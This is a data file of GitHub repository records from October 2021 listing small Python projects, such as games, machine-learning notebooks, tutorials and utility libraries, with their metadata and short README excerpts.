417842406;Fire-Detection-Deep-Learning-with-Python;https://github.com/TanzilParvez/Fire-Detection-Deep-Learning-with-Python;Jupyter Notebook;2021-10-16T13:53:25Z;1;1;0;Fire-Detection-Deep-Learning-with-Python This project is based on fire detection with Convolutional Neural Network. The file added is a google colab notebook. The dataset can be added on request. The project includes fire detection and alarm system from video and webcam.Place the code and dataset in your google drive and mount drive path in google. 
417872579;https-github.com-itsvinayak-selenium-python-examples;https://github.com/MohamadRazack/https-github.com-itsvinayak-selenium-python-examples;;2021-10-16T15:43:34Z;0;0;0;https-github.com-itsvinayak-selenium-python-examples 
417828718;Pokemon-Card-Game-using-Python-OOP;https://github.com/Purvil026/Pokemon-Card-Game-using-Python-OOP;Python;2021-10-16T12:57:51Z;0;0;0;
417784263;python-flask-and-flask_mail-otp-verification;https://github.com/AbdullahAlmizan644/python-flask-and-flask_mail-otp-verification;Python;2021-10-16T09:48:12Z;0;0;0;python-flask-and-flask_mail-otp-verification 
417762826;-Fun-Stuff-I-Made-In-Python;https://github.com/MuffinDev9/-Fun-Stuff-I-Made-In-Python;Python;2021-10-16T08:11:32Z;0;0;0;-Fun-Stuff-I-Made-In-Python This Is A Collection Of A Few Python Projects, Including: A Guess The Number Game, A Password Generator, A Magic 8 Ball, A Random Number Generator, A Rock, Paper, Scissors Game, I Hope You Like It, And Give Me Some Suggestions For The Future! 
417843491;AL_Programming_w_Python_Nanodegree-trained;https://github.com/MaryamHaghdoust1998/AL_Programming_w_Python_Nanodegree-trained;Jupyter Notebook;2021-10-16T13:57:46Z;0;0;0;
417790227;Image-encryption-and-decryption-using-python-tkinter;https://github.com/Shubham-yadav-723/Image-encryption-and-decryption-using-python-tkinter;Python;2021-10-16T10:11:27Z;0;0;0;Image-encryption-and-decyption-using-python-tkinter Encrypt your image with your unique key so that the image will not be accessible and to decrypt the same image use the same key which is used for encryption Language: Python3  (tkinter) IDE : VS code (you can use any IDE  like pycharm , python IDLE, spider and many others) Requirements to run the program:  Latest python version should be installed in your system  Steps to Encrypt and decrypt the image:  click on choose the image button and select the image you want to encrypt enter an integer key between 0 and 255 click on encrypt button you will get a successfull encryption msg  Steps to Decrypt the image:  click on choose the image button and select the image you want to decrypt enter the same integer key which is used at the time of encryption click on decrypt button you will get a successfull decryption message  connect me on linkedin for any queries: https://www.linkedin.com/in/shubham-y-3852a8184/ 
417863790;Estimate-Pose;https://github.com/luodiw/Estimate-Pose;Python;2021-10-16T15:10:09Z;0;0;0;
417783194;FlappyBirdGame;https://github.com/Priyangshu-Mandal/FlappyBirdGame;Python;2021-10-16T09:43:47Z;0;0;0;
417830272;Music-Player;https://github.com/Asianguy123/Music-Player;;2021-10-16T13:03:35Z;0;0;0;Music-Player CLI Music Player using Python3 Requirements  List of songs, must be loaded from a file into a list User must be able to create a named playlist and add songs from the song bank User must be able to add/remove songs from the playlist User must be able to retrieve the playlist at a later date User must be able to change running order of the playlist Playlist shuffle feature  Extensions  User must be able to create multiple playlists and have them displayed to choose from User must be able to edit the playlist name User must be able to delete the playlist  How To Run Coming Soon What I Learnt  Decomposing a problem into its various parts os module:  os.rename() os.remove()   manipulating lists in files removing need for global variables via use of parameters better code organisation through functions  Improvements 
417767900;DEvil-Text-editor;https://github.com/devilcoder69/DEvil-Text-editor;Tcl;2021-10-16T08:35:36Z;0;0;0;
417851371;hand-recognition;https://github.com/NEVI0/hand-recognition;Python;2021-10-16T14:25:04Z;0;0;0;
417857287;py2js-translator;https://github.com/ParaDogs/py2js-translator;Python;2021-10-16T14:46:25Z;0;0;0;
417824519;anki-helpers;https://github.com/AndrewDang-Tran/anki-helpers;Python;2021-10-16T12:40:44Z;0;0;0;Anki Helpers A python library for interacting with anki currently only supports AnkiConnect. 
417797244;CognitiveClass;https://github.com/AtulADas/CognitiveClass;;2021-10-16T10:44:47Z;0;0;0;
417821809;task-reminder;https://github.com/SHAYON2003/task-reminder;Python;2021-10-16T12:29:50Z;0;0;0;
417858607;forwarder;https://github.com/cool-gay/forwarder;;2021-10-16T14:51:25Z;0;0;0;forwarder A python port forwarding tool 
417798794;fabrikaotomasyon;https://github.com/sinasarikaya/fabrikaotomasyon;Python;2021-10-16T10:52:02Z;0;0;0;Python ile fabrika arayüz yazılımı Bu yazılım ile fabrikadaki makina verileri görüntülenebilir,eklenebilir,kaldıralabilir. Bu sayede veriler aracılığıyla gerekli kontroller sağlanır.Yazılım fabrikanın ihtiyaçları ve donanımları doğrultusunda entegre edilebilir, değiştirilebilir. Arayüz ekranından giriş yaptığımızda karşımıza kullanıcı adı ve şifre girişi çıkıyor. Gerekli girişi gerçekleştirme durumunda müdür veya personel olma durumuna göre yeni bir arayüz ekranına giriş sağlanıyor. Bu açılan arayüzde kullanıcı sınır alanlı kapsamında(müdür veya personel olma durumu) gerekli makine ve personel işlemler sağlanılabililiyor. #fabrikaotomasyon #python #fabrika #pycharm #sqlite    
417782234;pogue;https://github.com/TamplierS1/pogue;;2021-10-16T09:39:32Z;0;0;0;
417848232;cppython;https://github.com/mr-SkyDev/cppython;C++;2021-10-16T14:14:57Z;0;0;0;Функции из Python на C++ Пользуйтесь на здоровье поставьте звездочку пж 
417846324;Projeto-day-6;https://github.com/brunoribeir0/Projeto-day-6;;2021-10-16T14:08:10Z;0;0;0;Projeto-day-6 Árvore de decisão em python 
417796683;Internet_speed;https://github.com/parul021997/Internet_speed;Jupyter Notebook;2021-10-16T10:42:08Z;0;0;0;
417868617;Building-chatbot-in-python-and-deployment-using-flask;https://github.com/imnu13/Building-chatbot-in-python-and-deployment-using-flask;;2021-10-16T15:28:12Z;0;0;0;Building-chatbot-in-python-and-deployment-using-flask  What is chatbot? In simple terms chatbot is a computer program that uses AI and NLP which is natural language processing to generate automate response to user queries and simulates human conversation, it helps user to find information they need. Types of chatbots:  Text based chatbot Voice based chatbot  Chatbot are designed using applications:  Rule based chatbot: Self learning chatbot  This chatbot is Text based chatbot and application used is Rule based. How it works 
417857442;week-twenty-python-data-structure-control-flow-exercises;https://github.com/datainpoint/week-twenty-python-data-structure-control-flow-exercises;Jupyter Notebook;2021-10-16T14:47:02Z;0;0;0;week-twenty-python-data-structure-control-flow-exercises Week 20: Python Data Structure Control Flow Exercises 
417784117;Covid19-Namibia-Live-Stats-Python-Web-App;https://github.com/Fungai-Mahara/Covid19-Namibia-Live-Stats-Python-Web-App;Python;2021-10-16T09:47:36Z;0;0;0;
417829476;0x0C-python-almost_a_circle;https://github.com/jassemb/0x0C-python-almost_a_circle;;2021-10-16T13:01:03Z;0;0;0;0x0C. Python - Almost a circle General What is Unit testing and how to implement it in a large project How to serialize and deserialize a Class How to write and read a JSON file What is *args and how to use it What is **kwargs and how to use it How to handle named arguments in a function 
417837289;Udemy-Python-for-Data-Science-Machine-Learning-Bootcamp;https://github.com/tomritmanmeer/Udemy-Python-for-Data-Science-Machine-Learning-Bootcamp;Jupyter Notebook;2021-10-16T13:31:52Z;0;0;0;
417807697;Controlling-GPIO-pins-of-Raspberry-via-command-line-using-python;https://github.com/amiteshkr63/Controlling-GPIO-pins-of-Raspberry-via-command-line-using-python;Python;2021-10-16T11:29:35Z;0;0;0;Controlling-GPIO-pins-of-Raspberry-via-command-line-using-python Demonstration Video:https://www.youtube.com/watch?v=OFSGhPD_oHI  RED LED ON:  YELLOW LED ON:  
417768891;Assignment-3-Python-program-to-reverse-a-string.;https://github.com/10kiran/Assignment-3-Python-program-to-reverse-a-string.;;2021-10-16T08:40:47Z;0;0;0;Assignment-3-Python-program-to-reverse-a-string. 
417841287;Management-and-Analysis-of-Physics-Dataset-B-Python;https://github.com/davidemaniscalco/Management-and-Analysis-of-Physics-Dataset-B-Python;Jupyter Notebook;2021-10-16T13:48:27Z;0;0;0;Management-and-Analysis-of-Physics-Dataset-B-Python Final project of the course management and analysis of physics dataset (mod. B) from the master degree in Physics of Data 
417801271;Detecting_Fake_News_with_Python_and_Machine_Learning;https://github.com/DataScientist186/Detecting_Fake_News_with_Python_and_Machine_Learning;Python;2021-10-16T11:01:39Z;0;0;0;"Detecting_Fake_News_with_Python_and_Machine_Learning Do you trust all the news you hear from social media? All news are not real, right? How will you detect fake news? The answer is Python. By practicing this advanced python project of detecting fake news, you will easily make a difference between real and fake news. Before moving ahead in this machine learning project, get aware of the terms related to it like fake news, tfidfvectorizer, PassiveAggressive Classifier. What is a TfidfVectorizer? TF (Term Frequency): The number of times a word appears in a document is its Term Frequency. A higher value means a term appears more often than others, and so, the document is a good match when the term is part of the search terms. IDF (Inverse Document Frequency): Words that occur many times a document, but also occur many times in many others, may be irrelevant. IDF is a measure of how significant a term is in the entire corpus. The TfidfVectorizer converts a collection of raw documents into a matrix of TF-IDF features. What is a PassiveAggressiveClassifier? Passive Aggressive algorithms are online learning algorithms. Such an algorithm remains passive for a correct classification outcome, and turns aggressive in the event of a miscalculation, updating and adjusting. Unlike most other algorithms, it does not converge. Its purpose is to make updates that correct the loss, causing very little change in the norm of the weight vector. Detecting Fake News with Python: To build a model to accurately classify a piece of news as REAL or FAKE. About Detecting Fake News with Python This advanced python project of detecting fake news deals with fake and real news. Using sklearn, we build a TfidfVectorizer on our dataset. Then, we initialize a PassiveAggressive Classifier and fit the model. In the end, the accuracy score and the confusion matrix tell us how well our model fares. The fake news Dataset: The dataset we’ll use for this python project- we’ll call it news.csv. This dataset has a shape of 7796×4. The first column identifies the news, the second and third are the title and text, and the fourth column has labels denoting whether the news is REAL or FAKE. Project Prerequisites: You’ll need to install the following libraries with pip: pip install numpy pandas sklearn You’ll need to install Jupyter Lab to run your code. Get to your command prompt and run the following command: C:\Users\DataFlair>jupyter lab You’ll see a new browser window open up; create a new console and use it to run your code. To run multiple lines of code at once, press Shift+Enter. "
417797885;Discord-bot;https://github.com/Tagofficial/Discord-bot;;2021-10-16T10:47:41Z;0;0;0;Discord-bot A simple discord bot in python. 
417853900;MyFirstPyProgram;https://github.com/Estevam2302/MyFirstPyProgram;Python;2021-10-16T14:33:40Z;0;0;0;MyFirstPyProgram That is my first Python program. 
417857988;spark-submit;https://github.com/PApostol/spark-submit;Python;2021-10-16T14:49:10Z;0;0;0;"Spark-submit      TL;DR: Python manager for spark-submit jobs Description This package allows for submission and management of Spark jobs in Python scripts via Apache Spark's spark-submit functionality. Installation The easiest way to install is using pip: pip install spark-submit To install from source: git clone https://github.com/PApostol/spark-submit.git cd spark-submit python setup.py install  For usage details check help(spark_submit). Usage Examples Spark arguments can either be provided as keyword arguments or as an unpacked dictionary. Simple example: from spark_submit import SparkJob  app = SparkJob('/path/some_file.py', master='local', name='simple-test') app.submit()  print(app.get_state())  Another example: from spark_submit import SparkJob  spark_args = {     'master': 'spark://some.spark.master:6066',     'deploy_mode': 'cluster',     'name': 'spark-submit-app',     'class': 'main.Class',     'executor_memory': '2G',     'executor_cores': '1',     'total_executor_cores': '2',     'verbose': True,     'conf': [""spark.foo.bar='baz'"", ""spark.x.y='z'""],     'main_file_args': '--foo arg1 --bar arg2'     }  app = SparkJob('s3a://bucket/path/some_file.jar', **spark_args) print(app.submit_cmd) print(app.env_vars)  # monitor state in the background every x seconds with `await_result=x` app.submit(use_env_vars=True, await_result=10)  print(app.get_state()) # 'SUBMITTED'  # do other stuff...  print(app.get_state()) # 'FINISHED'  Examples of spark-submit to spark_args dictionary: A client example: ~/spark_home/bin/spark-submit \ --master spark://some.spark.master:7077 \ --name spark-submit-job \ --total-executor-cores 8 \ --executor-cores 4 \ --executor-memory 4G \ --driver-memory 2G \ --py-files /some/utils.zip \ --files /some/file.json \ /path/to/pyspark/file.py --data /path/to/data.csv  becomes spark_args = {     'master': 'spark://some.spark.master:7077',     'name': 'spark_job_client',     'total_executor_cores: '8',     'executor_cores': '4',     'executor_memory': '4G',     'driver_memory': '2G',     'py_files': '/some/utils.zip',     'files': '/some/file.json',     'main_file_args': '--data /path/to/data.csv'     } main_file = '/path/to/pyspark/file.py' app = SparkJob(main_file, **spark_args)  A cluster example: ~/spark_home/bin/spark-submit \ --master spark://some.spark.master:6066 \ --deploy-mode cluster \ --name spark_job_cluster \ --jars ""s3a://mybucket/some/file.jar"" \ --conf ""spark.some.conf=foo"" \ --conf ""spark.some.other.conf=bar"" \ --total-executor-cores 16 \ --executor-cores 4 \ --executor-memory 4G \ --driver-memory 2G \ --class my.main.Class \ --verbose \ s3a://mybucket/file.jar ""positional_arg1"" ""positional_arg2""  becomes spark_args = {     'master': 'spark://some.spark.master:6066',     'deploy_mode': 'cluster',     'name': 'spark_job_cluster',     'jars': 's3a://mybucket/some/file.jar',     'conf': [""spark.some.conf='foo'"", ""spark.some.other.conf='bar'""], # note the use of quotes     'total_executor_cores: '16',     'executor_cores': '4',     'executor_memory': '4G',     'driver_memory': '2G',     'class': 'my.main.Class',     'verbose': True,     'main_file_args': '""positional_arg1"" ""positional_arg2""'     } main_file = 's3a://mybucket/file.jar' app = SparkJob(main_file, **spark_args)  Additional methods spark_submit.system_info(): Collects Spark related system information, such as versions of spark-submit, Scala, Java, Python and OS spark_submit.SparkJob.kill(): Kills the running Spark job (cluster mode only) spark_submit.SparkJob.get_code(): Gets the spark-submit return code spark_submit.SparkJob.get_output(): Gets the spark-submit stdout License Released under MIT by @PApostol  You can freely modify and reuse The original license must be included with copies of this software Please link back to this repo if you use a significant portion the source code  "
417777529;learnningclickbook;https://github.com/lizkca/learnningclickbook;;2021-10-16T09:19:38Z;0;0;0;learnningclickbook a book about learnning python module click. 
417846733;RF-Install-RF;https://github.com/jgdevrennes/RF-Install-RF;HTML;2021-10-16T14:09:37Z;0;0;0;Install Python And RobotFramework for Windows  Install Python And RobotFramework for Windows  Install Python Install Webdrivers Install Library RobotFramework Example Usage    Install Python  https://www.python.org/downloads/windows/ Download Python 3.10.0 for Windows 64-bit: https://www.python.org/ftp/python/3.10.0/python-3.10.0-amd64.exe Launch python-3.10.0-amd64.exe Select Customize installation    Optionals Features    Advanced Options     Select Install   Add Python to Path: Variables environnement (Variables système)  C:\Python310\Scripts C:\Python310\ C:\Python310\Lib\site-packages    Open cmd and type:   Python --version  If you see Python 3.10.0 Python is installed ! :)  Install Webdrivers  https://www.selenium.dev/downloads/ Download Webdrivers(chromedriver, geckodriver, msedgedriver, operadriver)    Put chromedriver.exe, geckodriver.exe, msedgedriver.exe, operadriver.exe in folder C:\Webdrivers    Add Webdrivers to Path : Variables environnement (Variables système)  C:\Webdrivers   Open cmd in C:\Webdrivers and type :  chromedriver.exe --version  If you see(exemple) : ChromeDriver 93.0.4577.635 ChromeDriver is installed ! :)  Install Library RobotFramework   requirements.txt   Open cmd in C:\YourPathFolder and type :   pip install -r requirements.txt  Open cmd and type :  robot --version  If you see(exemple) : Robot Framework 4.1.1 Robot Framework is installed ! :)  Example *** Settings *** Documentation     A test suite with a single test for testing install RobotFramework On Windows ... ...               This test has a workflow that is created using keywords in ...               the imported resource file. Resource  ..//Resources//Base.resource Suite Setup   SuiteSetupBase  *** Test Cases *** S01-TC01-Open Browser   Launch ${BROWSER} And Go To ${URL}   Verify Page Accessibility Guidelines (WCAG) Overview Is Display   [Teardown]    Close Browser Usage  Open cmd in C:\YourPathFolder\SuiteTests and type :  robot --outputdir ..\Reporting\Ouputs S01.robot 
417868513;Pycraft;https://github.com/123opkuba/Pycraft;;2021-10-16T15:27:50Z;0;0;0;
417873150;hello;https://github.com/YaremaY/hello;;2021-10-16T15:45:39Z;0;0;0;
417833643;-bz9-numeros-romanos;https://github.com/bylijoe/-bz9-numeros-romanos;Python;2021-10-16T13:16:54Z;0;0;0;#Clase numeros romanos Clase en Python para utilizar numeros romanos. Tabla de equivalencias Los símbolos básicos y sus equivalencias decimales son: M → 1000 D → 500 C → 100 L → 50 X → 10 V → 5  I → 1  MMMCMXCIX==> 3999 Numeros mayores de 3999 __ IV >> (IV) ==> 4000 _ x >> (X) ==> 10000 
417808455;hello;https://github.com/sohaibabdullah/hello;HTML;2021-10-16T11:32:46Z;0;0;0;
417847372;souilymohhajzin;https://github.com/zack200619/souilymohhajzin;;2021-10-16T14:11:54Z;0;0;0;
417793894;hello;https://github.com/imb4n/hello;;2021-10-16T10:28:40Z;0;0;0;
417764164;211016_PL_Images;https://github.com/Eseifan/211016_PL_Images;Jupyter Notebook;2021-10-16T08:17:31Z;1;1;0;211016_PL_Images Python lab images classification tutorial with Keras 
417844408;CursoRedesNeuro;https://github.com/IrazuValdivia/CursoRedesNeuro;TeX;2021-10-16T14:01:13Z;0;0;0;CursoRedesNeuro Curso de redes neuronales de python 
417813320;Beautiful_Soup_Web_Scraping;https://github.com/EdAncerys/Beautiful_Soup_Web_Scraping;Python;2021-10-16T11:53:55Z;0;0;0;A super simple web scraping bot example with Python using BeautifulSoup Web Scraping bot scrapes selected web app and returns Top 100 movies of all time listed in web and save it to .txt file Basic Usage Run main.py in PyCharm and follow the console logs to navigate 
417763032;HW2;https://github.com/Khongorzul26/HW2;Python;2021-10-16T08:12:26Z;0;0;0;
417870976;MySecondPyProgram;https://github.com/Estevam2302/MySecondPyProgram;Python;2021-10-16T15:37:08Z;0;0;0;MySecondPyProgram That's my second Python program. 
417778339;remote-command-for-Windows-;https://github.com/Tony142857e/remote-command-for-Windows-;;2021-10-16T09:23:05Z;0;0;0;
417796153;TIC-TAC-TOE;https://github.com/Vedika1102/TIC-TAC-TOE;Jupyter Notebook;2021-10-16T10:39:10Z;0;0;0;TIC-TAC-TOE Python code to play TIC TAC TOE 
417817958;backup_azure_devops_repos;https://github.com/wuhaibo/backup_azure_devops_repos;;2021-10-16T12:12:39Z;0;0;0;
417770852;pymot;https://github.com/yswd82/pymot;;2021-10-16T08:50:12Z;0;0;0;pymot python based excel generate utility tool. 
417807367;reviewingbasics;https://github.com/luisgnc/reviewingbasics;Python;2021-10-16T11:28:15Z;0;0;0;
417778459;helllo;https://github.com/PufflyMan/helllo;;2021-10-16T09:23:39Z;0;0;0;
417777167;Scheme-REPL;https://github.com/AnikethP/Scheme-REPL;Python;2021-10-16T09:17:57Z;0;0;0;Scheme-REPL Description: A read–eval–print loop (REPL), also termed an interactive toplevel or language shell, is a simple interactive computer programming environment that takes single user inputs, executes them, and returns the result to the user. This project utilizes a read-eval-print loop to parse user input in the scheme language and evaluate it internally using Python. Implementation Overview: Read: This step parses user input (a string of Scheme code) into the interpreter's internal Python representation of Scheme expressions (e.g. Pairs). Lexical analysis occurs in scheme_tokens.py. This function returns a Buffer (from buffer.py) of tokens. Syntactic analysis happens in scheme_reader.py, in the scheme_read and read_tail functions. Together, these mutually recursive functions parse Scheme tokens into the interpreter's internal Python representation of Scheme expressions. Eval: This step evaluates Scheme expressions (represented in Python) to obtain values. Code for this step is in the main scheme.py file. Print: This step prints the str representation of the obtained value. Loop: The logic for the loop is handled by the read_eval_print_loop function in scheme.py.    File Description     scheme.py implements the REPL and a evaluator for Scheme expressions   scheme_reader.py implements the reader for Scheme input. The Pair class and nil definition can be found here.   scheme_tokens.py implements the tokenizer for Scheme input   scheme_builtins.py implements built-in Scheme procedures in Python   buffer.py implements the Buffer class, used in scheme_reader.py   ucb.py utility functions for use in 61A projects    Running the interpreter: To start an interactive Scheme interpreter session, type: python3 scheme.py  
417844957;jezyki_skryptowe;https://github.com/IzaGg/jezyki_skryptowe;;2021-10-16T14:03:02Z;0;0;0;jezyki_skryptowe Programy i projekty: Bash, Tcsh i Python 
417830033;pysnid;https://github.com/MickaelRigault/pysnid;Python;2021-10-16T13:02:51Z;0;0;0; pysnid simple python wrapper to run SNID Installation Assuming you already have snid installed see here Simply pip install pysnid Usage If you want to fit a spectra stored under filename=YOUR_DIR_PATH/spectra.ascii Then: import pysnid snidres = pysnid.run_snid(filename) snidres is a custom made object (SNIDReader) that contains useful tools to access and visualise SNID input and output. the input data is stored as snidres.data (DataFrame) and the snid result table as snidres.results. for instance: snidres.results    To visualize the template matching do (here the best matches 1, 2 and 4 (only the fist is shown by default) : snidres.show(models=[1,2,4])    Some more details pysnid.run_snid() creates by default a new h5 file with the same path as the input file but for the extension replaced by _snid.h5. Use pysnid.SNIDReader.from_filename(outfile) to read this file. 
417854228;por_onde_andei_tutorial;https://github.com/MieleSantos/por_onde_andei_tutorial;Python;2021-10-16T14:35:00Z;0;0;0;Por Onde Andei: Tutorial 09 Python Brasil 2021 Tutorial Viajando por uma API protegida: Implementando uma API com Flask Ministrado(a) por: Jessica Temporal Esta API é escrita em Flask e usa Pandas, Folium e Auth0. Seu objetivo principal é servir um mapa de lugares que foram marcados. Requirements  Python == 3.8.2 Flask == 2.0.0 Uma conta gratuita da Auth0, cadastre-se gratuitamente aqui.  Environment pip install -U pip pip install -r requirements.txt Configurações Crie o arquivo .config seguindo o arquivo de exemplo .example.config e preencha os valores faltantes. Rodando a API Em desenvolvimento flask run Acesse: http://127.0.0.1:5000/. Em produção gunicorn app:app  Acesse: http://127.0.0.1:8000/. Navegando pelos passos    Passos Explicação     passo-0 Tudo que você precisa para fazer o setup inicial do projeto   passo-1 Vamos criar os dois primeiros endpoints, templates e rodar o projeto   passo-2 Vamos criar os dois endpoints que geram o nosso mapa e as funções que fazem ajustes de dados   passo-3 Vamos configurar a conta na Auth0 e proteger os endpoints   passo-4 Momento do deploy, configurar o código para o Heroku    
417806625;PySnake;https://github.com/JettPy/PySnake;;2021-10-16T11:25:01Z;0;0;0;"PySnake Игра ""Змейка"" на Python 3.0 "
417814846;PlotToolkits;https://github.com/XingyanLiu/PlotToolkits;R;2021-10-16T12:01:01Z;0;0;0;PlotToolkits Plot functions for Python and R 
417808896;Tic-tac-toe;https://github.com/Kohirochi/Tic-tac-toe;Python;2021-10-16T11:34:41Z;0;0;0;Tic-tac-toe Tic-tac-toe game with python. 
417810254;alien_invasion;https://github.com/yousefelassal/alien_invasion;HTML;2021-10-16T11:41:04Z;0;0;0;alien_invasion A game made using python-pygame player fights aliens that are trying to take control of the Earth using a spaceship that fire bullets Requirments  Python 3.x (recommended) from here Pygame from here  Usage to start the game run python alien_invasion.py  Use arrow keys to move in canvas:  → move right ← move left  and Space to shoot. Screenshot  
417804569;Feed_The_Dragon;https://github.com/suryakantkarnwal/Feed_The_Dragon;Python;2021-10-16T11:16:04Z;0;0;0;This game is build using Python library Pygame. Dragon has to collect incoming coin otherwise player will loose one lives. Your score increases as you collect coin. As you move forward in the game ,speed of the incoming coins keep on increasing Hope you will like it 
417813526;pyche-example;https://github.com/dmrq70/pyche-example;;2021-10-16T11:54:58Z;0;0;0;
417817669;Tic-Tac_toe;https://github.com/AksshayaR/Tic-Tac_toe;Python;2021-10-16T12:11:24Z;0;0;0;Tic-Tac_toe Tic tac toe using python tkinter library 
417834559;hello;https://github.com/damilare15/hello;HTML;2021-10-16T13:20:31Z;0;0;0;
417809289;ProjectCollege;https://github.com/namemaksim/ProjectCollege;Python;2021-10-16T11:36:38Z;0;0;0;
417817236;CS50_RAJIV;https://github.com/RAJIVPORANA/CS50_RAJIV;;2021-10-16T12:09:44Z;0;0;0;
417833815;jamesg-indieauth;https://github.com/capjamesg/jamesg-indieauth;Python;2021-10-16T13:17:28Z;0;0;0;"James' IndieAuth Endpoint This repository contains the code for my IndieAuth endpoint. This endpoint has been developed in adherence with the IndieAuth specification, a method of authentication built on top of OAuth 2.0. Using this project, you can authenticate yourself to a service by using RelMeAuth. RelMeAuth requires you have rel=""me"" links on your blog that link to social profiles. At the moment, this project only supports the following rel=me links:  GitHub Twitter  You can also authenticate using Okta Verify's passwordless solution. To do so, you will need to have an active Okta developer account. Screenshot  Setup To setup this project, first install the required dependencies. You can do this using the following command: pip3 install -r requirements.txt  Next, you will need to add some configration variables to a file called config.py. Create a file called config.py in the root directory of the project. Add the following value to the file: ME=""https://yourdomain.com""  Next, add your Twitter API keys to the file like so (leave all values you do not want to specify as """"): TWITTER_OAUTH_KEY=""KEY"" TWITTER_OAUTH_SECRET=""SECRET""  These values can be obtained from Twitter. You will need a Twitter Developer account to obtain these values. Then add your GitHub OAuth API keys (leave all values you do not want to specify as """"): GITHUB_CLIENT_ID = ""ID"" GITHUB_OAUTH_REDIRECT = ""URL"" GITHUB_CLIENT_SECRET = ""SECRET""  You can retrieve these pieces of information by following the GitHub ""Creating an OAuth App"" guide. Next, add your Okta API keys (leave all values you do not want to specify as """"): OKTA_DOMAIN = ""DOMAIN"" OKTA_ACCESS_TOKEN = ""TOKEN"" OKTA_USER_ID = ""ID"" OKTA_FACTOR_ID = ""ID""  You can learn more about Okta and their APIs by reading the Okta API documentation. Using the keys above, this application will be able to authenticate you using Twitter, GitHub, and Okta. Finally, add a secret key to your config.py file: SECRET_KEY = ""KEY""  This key is used by Flask and is required for this web application to run. Your secret key must be kept secret. Next, run the IndieAuth server using Flask: python3 app.py  If you plan to deploy the server on production, please use an appropriate production deployment method (i.e. using Gunicorn) as you would for any other Flask application. Licence This project is licensed under the MIT License Contributors  capjamesg  "
417831056;passman;https://github.com/chipinvision/passman;Python;2021-10-16T13:06:54Z;0;0;0;   passman - A Password Manager written using Python  A password manager written using Python which takes your password and its details and store it into a text file. We are acepting pull requests, so willing devs can do so... 
417844751;BookInventory.PY;https://github.com/annguyendl/BookInventory.PY;;2021-10-16T14:02:16Z;0;0;0;BookInventory.PY Desktop GUI with Python and Database. Source code and documents from https://www.udemy.com/course/the-python-mega-course. 
417800355;Programming;https://github.com/esuriddick/Programming;R;2021-10-16T10:58:30Z;0;0;0;Objective The aim of this repository is to share some of the work that I have developed in different programming languages (R, Python, etc.). Index The following work is currently available within this repository:   R  Password Strength Estimator (zxcvbn) Monte-Carlo Simulator    Python  Soon available.    License All of the work shared in this repository is under the GNU General Public License v3.0. 
417800651;From-Moon-to-Earth;https://github.com/AlexxyQQ/From-Moon-to-Earth;Python;2021-10-16T10:59:43Z;0;0;0;     From Moon to Earth   A simple retro shooter game.         About the Game      From Moon to Earth is a simple arcade game, with a fun and enjoyable game design and elements.  Built With  Pygame Tkinter SQLite3  Demos  This game was designed with a simple and appealing assets in mind whiles being fun and enjoyable for the player.        Getting Started Theses are the instructions on how you can run the program with pycharm . Installation For fast access just download the repo and run From Moon to Earth.exe.  Clone the repo  git clone https://github.com/AlexxyQQ/From-Moon-to-Earth.git   Install pygame for game to work.  pip install pygame  Acknowledgements  Figma Imgur Flaticon mixkit   Appendix [Addition screenshots](https://imgur.com/a/VXUJkCs) 
417839312;Customer-Term-Deposit-Subscriptions-Predictions;https://github.com/jofawj/Customer-Term-Deposit-Subscriptions-Predictions;;2021-10-16T13:40:09Z;0;0;0;🏦 Customer's Subsriptions Predictions This repository is for my Milestone 1 at Phase 1. It's about making a predictions for a bank's customer subscription for new campaign In this repository i will share my notebook and my heroku deployment with Dash. Here if you want to see the dataset For my heroku deployment, you can click this link : https://achmadnaufalwj-p1mls1.herokuapp.com/  Datasets Information    No. Columns Description     1. age numeric   2. job type of job   3. marital marital status   4. education last education   5. default has credit in default?   6. housing has housing loan?   7. loan has personal loan?   8. contact contact communication type   9. month last contact month of year   10. dayofweek last contact day of the week   11. duration last contact duration, in seconds   12. campaign number of contacts performed during this campaign and for this client   13. pdays number of days that passed by after the client was last contacted from a previous campaign   14. previous number of contacts performed before this campaign and for this client   15. poutcome outcome of the previous marketing campaign   16. emp.var.rate employment variation rate - quarterly indicator   17. cons.price.idx consumer price index - monthly indicator   18. cons.conf.idx consumer confidence index - monthly indicator   19. euribor3m euribor 3 month rate - daily indicator   21. y has the client subscribed a term deposit?    Hope it can be useful for you 🥰 -WJ 
417763152;airbnb-clone;https://github.com/makealight/airbnb-clone;;2021-10-16T08:12:59Z;0;0;0;
417771031;Mikraot-Extras;https://github.com/Hadayo/Mikraot-Extras;Python;2021-10-16T08:50:59Z;0;0;0;"Mikraot Extras Want to be the perfect officer? then you need to practice! ""Aluf HaMikraot"" is an amazing app, but a little bit outdated. And it doesn't cover all the learning material. Well don't feel bad yet. Just add your question to questions.csv and use the script to test yourself. How to add your questions Your questions should be added to the questions.csv file. This file has 5 columns - one for the questions, and four for answers. The convention I used is that the first answer is the right answer. Don't worry, the script will display the possible answers in a random order each time. "
417798906;bmi_calc;https://github.com/Grahame-student/bmi_calc;Python;2021-10-16T10:52:31Z;0;0;0;bmi_calc Example BMI calculator application using QT5 and python Requirements Python 3.x installed Getting Started - Windows Clone the project Run the prepare_venv.bat file Run the run_application.bat file 
417865316;cirlcle-ci-tutorial;https://github.com/josef-mirante/cirlcle-ci-tutorial;Python;2021-10-16T15:15:39Z;0;0;0;
417822456;tic-tac-toe-project;https://github.com/framzz/tic-tac-toe-project;Jupyter Notebook;2021-10-16T12:32:12Z;0;0;0;tic-tac-toe-project Tic-Tac-Toe Game Project - All in Python 
417855412;Wine-Quality;https://github.com/Teresawithoutah/Wine-Quality;Jupyter Notebook;2021-10-16T14:39:31Z;0;0;0;Wine-Quality determine quality of wine by its chemical makeup using python Using ML, the question of whether we can determine the quality of wine based on a certain chemical makeup is answered. Description of the data set Through the UCI ML Repository,* we selected a dataset detailing red vinho (wine) samples from the north of Portugal. The datasets contained 12 attributes based on physicochemical tests ranging from: fixed acidity volatile acidity citric acid residual sugar chlorides free sulfur dioxide total sulfur dioxide density pH Sulphates alcohol level quality Results We applied classification to answer how several variables are related --  specifically how the 11 categorized features of our data set impacts quality of wine. Comparing the two models, we have found that they are more or less equally accurate in predicting new data although we would consider Logistic Regression as the better model due to the higher AOC score it produces. 
417793851;TensorRT-BUILD-Templates;https://github.com/harry-stark/TensorRT-BUILD-Templates;Jupyter Notebook;2021-10-16T10:28:30Z;0;0;0;TensorRT-BUILD-Templates A python notebook template to build TensorRT OSS components. 
